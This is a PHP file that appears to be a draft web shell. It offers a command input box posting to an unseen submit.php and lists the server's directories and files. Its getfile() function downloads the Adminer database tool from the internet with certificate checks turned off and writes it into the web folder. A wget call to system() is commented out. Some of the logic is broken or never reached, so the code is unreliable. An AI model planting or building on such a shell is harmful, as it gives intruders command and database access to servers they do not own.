<?php
function OS(){
  return substr(strtoupper(PHP_OS), 0, 3) === "WIN" ? "Windows" : "Linux";
}
function getfile($name) {
  if(!is_writable(getcwd())) die("Directory '".getcwd()."' is not writeable. Can't spawn $name.");
  if($name === "submit.php") $get = array("https://www.adminer.org/static/download/4.3.1/adminer-4.3.1.php", "adminer.php");

  $fp = fopen($get[1], "w");
  $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, $get[0]);
      curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_FILE, $fp);
  return curl_exec($ch);
        curl_close($ch);
  fclose($fp);
  ob_flush();
  flush();
}
if (!file_exists("submit.php")) {
  if (OS() === 'Windows') {
    # code...
  }
  elseif (OS() === 'Linux') {
    //system("wget link file");
  }
}
function files($type, $dir) {
  $result = [];
  foreach (scandir($dir) as $key => $value) {
    $filename['fullname'] = $dir . DIRECTORY_SEPARATOR . $value;
    switch ($type) {
      case 'dir':
        if (!is_dir($filename['fullname']) || $value === '.' || $value === '..') continue 2;
        break;
      
      case 'file':
        if (!is_file($filename['fullname'])) continue 2;
        break;
    }
    $filename['name'] = basename($filename['fullname']);

    $result[] = $filename;
  } return $result;
}
?>
<style type="text/css">
  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
  * {
    font-family: 'Roboto', sans-serif;
  }
</style>
<table>
  <form method="POST">
    <tr>
      <td>
        <input class="ls" placeholder="command">
      </td>
    </tr>
    <tr>
      <td colspan="2">
        <input name="submit" type="button" value="Submit" class="submit">
      </td>
    </tr>
</form>
<tr>
  <td>
    <div id="data"></div>
  </td>
</tr>
<span class="error" style="display:none"> Please Enter Valid Data</span>
<script src="http://code.jquery.com/jquery-1.9.1.js"></script>
<script src="https://code.jquery.com/jquery-3.4.1.js"></script>
<script type="text/javascript" >
  $(function () {
    $(".submit").click(function (event) {
      var ls = $(".ls").val();
      var dataString = 'ls=' + ls;
      console.log(dataString);
      if (ls == '')
      {
        $('.success').fadeOut(200).hide();
        $('.error').fadeOut(200).show();
      } else
      {
        $.ajax({
          type: "POST",
          url: "submit.php",
          data: dataString,
          beforeSend: function () {
                $('#data').html('<img src="https://www.bluechipexterminating.com/wp-content/uploads/2020/02/loading-gif-png-5.gif" width="25" height="25"/>')
            },
          success: function (data) {
            $('.success').fadeIn(200).show();
            $('.error').fadeOut(200).hide();
            $("#data").html(data);
          }
        });
      }
      event.preventDefault();
    });
  });
</script>
<script type="text/javascript">
  $(function () {
    $(".cd").click(function (event) {
      var file = $(".file").val();
      var dataString = 'file=' + file;
      console.log(dataString);
      if (file == '')
      {
        $('.success').fadeOut(200).hide();
        $('.error').fadeOut(200).show();
      } else
      {
        $.ajax({
          type: "POST",
          url: "submit.php",
          data: dataString,
          beforeSend: function () {
                $('#data').html('<img src="https://www.bluechipexterminating.com/wp-content/uploads/2020/02/loading-gif-png-5.gif" width="25" height="25"/>')
            },
          success: function (data) {
            $('.success').fadeIn(200).show();
            $('.error').fadeOut(200).hide();
            $("#data").html(data);
          }
        });
      }
      event.preventDefault();
    });
  });
</script>
<?php
foreach (files('dir', getcwd()) as $key => $value) { ?>
      <tr>
        <form method="post">
          <td>
            <input name="cd" type="button" value="<?= $value['name'] ?>" class="cd file">
          </td>
        </form>
      </tr>
    <?php }
    foreach (files('file', getcwd()) as $key => $value) { ?>
      <tr>
        <form method="post">
          <td>
            <input type="text" class="file" value="<?= $value['fullname'] ?>">
            <input name="cd" type="button" value="<?= $value['name'] ?>" class="cd">
          </td>
        </form>
      </tr>
    <?php }
?>
</table>
